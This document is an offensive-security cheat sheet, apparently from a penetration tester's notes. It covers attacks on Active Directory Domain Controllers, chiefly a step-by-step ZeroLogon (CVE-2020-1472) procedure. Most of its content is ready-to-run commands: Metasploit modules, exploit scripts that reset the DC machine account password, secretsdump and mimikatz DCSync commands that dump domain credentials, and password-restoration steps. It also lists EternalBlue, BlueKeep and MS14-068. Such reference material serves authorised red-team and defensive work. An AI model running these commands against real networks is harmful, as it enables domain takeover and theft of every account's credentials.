# Active Directory - Domain Controllers vulnerabilities

### RCE on exposed Windows services

The services exposed by the Domain Controllers may be vulnerable to well known
critical vulnerabilities that can be leveraged to remotely execute code on a
vulnerable Domain Controller.

The following vulnerabilities are worth mentioning:

| Vulnerability | Service | Patch release date | Note |
|---------------|---------|--------------------|------|
| `EternalBlue` / `MS17-010` | `SMB`: TCP Port 445 | March 14, 2017 | `[L7] 445 SMB` |
| `BlueKeep` / `CVE-2019-0708` | `Terminal Services`: TCP port 3389 | May 13, 2019 | Vulnerable operating systems: <br> <= `Windows 2008 / 2008 R2` <br> <= `Windows 7` <br><br> `[L7] 3389 RDP` |

### (Likely patched) MS14-068

`MS14-068` is a vulnerability that lies in the Microsoft implementation of the
`Kerberos` protocol. A problem in the verification of the `Privilege Attribute
Certificate (PAC)` in a `Kerberos` `service ticket` request allows any domain
user may to forge a `PAC` with arbitrary privileges.

The `Metasploit`'s `ms14_068_kerberos_checksum` module can be used to request a
`kerberos` `Ticket-Granting Ticket (TGT)` with a forged `PAC`. The `TGT` is
exported by the module is the `credential cache (ccache)` format. Refer to the
`[ActiveDirectory] Kerberos tickets usage` for more information on how to use
the `Kerberos` ticket from Windows and Linux operating systems.

```
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
```

### ZeroLogon - CVE-2020-1472

`ZeroLogon` is a critical security flaw (`CVSS` score: 10.0) in the Active
Directory `Netlogon Remote Protocol` `MSRPC` protocol (`MS-NRPC`).

As stated in the [original research
publication](https://www.secura.com/blog/zero-logon): "The vulnerability stems
from a flaw in a cryptographic authentication scheme used by the `Netlogon
Remote Protocol`, which among other things can be used to update computer
passwords. This flaw  allows attackers to impersonate any computer, including
the domain controller itself, and execute remote procedure calls on their
behalf."

Knowledge of the targeted Domain Controller (`DC`) machine account password can
notably be leveraged to conduct `DCSync` attacks.

However, resetting the `DC` machine account password through this
attack will break communications with others `Domain Controllers` and make the
`DC` misbehave in undefined ways. As the password is only updated in the Active
Directory `ntds.dit` database, the previous `DC` machine account password can
be retrieved in the `HKLM\Security` hive (`HKLM\SECURITY\Policy\Secrets\
$machine.ACC`) of the `DC` and restored.

###### Exploitation in Python - Impacket update

For exploit code using `impacket`, the library must be updated to, at least,
the version published on `September 15th 2020` (update to the `dcerpc.v5.nrpc`
library). In order to do so, a Python `virtualenv` can be created or the
system-wide `impacket` installation updated:

```
# Creation of a Python virtualenv
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472
python3 -m pip install virtualenv
python3 -m virtualenv impkt
source impkt/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket

# System wide update from sources.
apt remove --purge impacket impacket-scripts python-impacket python3-impacket
apt autoremove
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip3 install .
python3 setup.py install
```

Alternatively, static standalone binaries (embedding `impacket`) for Windows
and Linux (both x64) are available in the following GitHub repository:
`https://github.com/Qazeer/dirkjanm_CVE-2020-1472_static_binaries`.

###### 0. Detection

Multiple tools may be used to detect if the Domain Controllers are vulnerable
to the `ZeroLogon` vulnerability.

`PingCastle`'s `zerologon` scanner presents the advantage of automatically
enumerating the Domain Controllers through AD requests and conduct scan for all
the enumerated Domain Controllers. It however can only be executed from a
machine integrated in the targeted Active Directory domain.  

```
PingCastle.exe --scanner zerologon --scmode-dc

# The -patch flag is required to conduct the scan from a non domain-joined client.
# Compiled binary: https://github.com/r3motecontrol/Sharp-Suite-CompiledBinaries
SharpZeroLogon.exe <DC_FQDN> <-patch>

Invoke-Zerologon -FQDN <DC_FQDN>
```

###### 1. DC machine account password reset

Multiple tools may be used to exploit the `ZeroLogon` vulnerability to set an
empty password for the targeted `DC` machine account.

```
secretsdump_linux -just-dc -no-pass "<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>"
secretsdump_windows.exe -just-dc -no-pass "<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>"

# Source: https://github.com/dirkjanm/CVE-2020-1472
python3 cve-2020-1472-exploit.py <DC_NETBIOS_NAME> <DC_IP>

msf > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set action REMOVE
...

# The -patch flag is required to conduct the scan from a non domain-joined client.
# Compiled binary: https://github.com/r3motecontrol/Sharp-Suite-CompiledBinaries
SharpZeroLogon.exe <DC_FQDN> -reset <-patch>

Invoke-Zerologon -FQDN <DC_FQDN> -Reset
```

###### 2. Empty password DCSync

`Impacket`'s `secretsdump` or `mimikatz` may be used to conduct replication
operations (`DCSync`) using the `DC` machine account with an empty password.

```
secretsdump.py -just-dc -no-pass '<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>'

# Static compiled binary: https://github.com/ropnop/impacket_static_binaries
secretsdump_windows.exe -just-dc -no-pass '<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>'
secretsdump_linux_x86_64 -just-dc -no-pass '<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>'

mimikatz # lsadump::dcsync /domain:<DOMAIN> /dc:<DC_FQDN> /user:<krbtgt | USERNAME> /authuser:<DC_MACHINE_ACCOUNT$> /authdomain:<DOMAIN_NETBIOS_NAME> /authpassword:"" /authntlm
```

###### 3. DC machine account password restoration

Remote access to the `HKLM\SECURITY` registry hive requires `Domain Admin`
privileges. Access conducted using the DC machine account thus result in
access denied error (`rpc_s_access_denied`). The extraction of the `DC`
plaintext machine password from the `HKLM\SECURITY` registry hive must be done
using of the `Domain Admin` accounts compromised during the previous `DCSync`
attack.

`Impacket`'s `secretsdump.py` Python script can be used to remotely extract the
`DC` machine account secrets from the `HKLM\SECURITY` registry hive. A version
post the 15th 2020 update should be used as it will automatically dump the
plaintext machine password hex encoded required for the restoration (using
dirkjanm's `restorepassword.py` Python script and the `Metasploit`'s
`cve_2020_1472_zerologon` module).

Alternatively, remote code execution using `Domain Admin` or `Operators`
credentials can be leveraged to retrieve the `HKLM\SAM`, `HKLM\SECURITY`, and
`HKLM\SYSTEM` registry hives from the `DC` and `Impacket`'s `secretsdump.py`
Python script used to locally extract the DC machine password from the hives.
Refer to the `[Windows] Lateral movements` and `[Windows] Post exploitation`
notes for more information.  

```
# Retrieves the original DC machine account hex encoded plain-text password and NTLM hash.
secretsdump.py -hashes ":<NTLM>" '<DOMAIN>/<Administrator | DA_USERNAME>@<DC_IP>'

# Restore the DC machine account original password.

restorepassword_windows.exe -target-ip "<DC_IP>" -hexpass "<DC_MACHINE_ACCOUNT_HEX_PASSWORD>" "<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>"
restorepassword_linux -target-ip "<DC_IP>" -hexpass "<DC_MACHINE_ACCOUNT_HEX_PASSWORD>" "<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>"

# Source: https://github.com/dirkjanm/CVE-2020-1472
python3 restorepassword.py -target-ip <DC_IP> -hexpass <DC_MACHINE_ACCOUNT_HEX_PASSWORD> '<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>'

msf > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
msf auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set action RESTORE
...

# Source: https://github.com/risksense/zerologon
python3 reinstall_original_pw.py <DC_NETBIOS_NAME> <DC_IP> <ORIGINAL_NTLM_HASH>
```
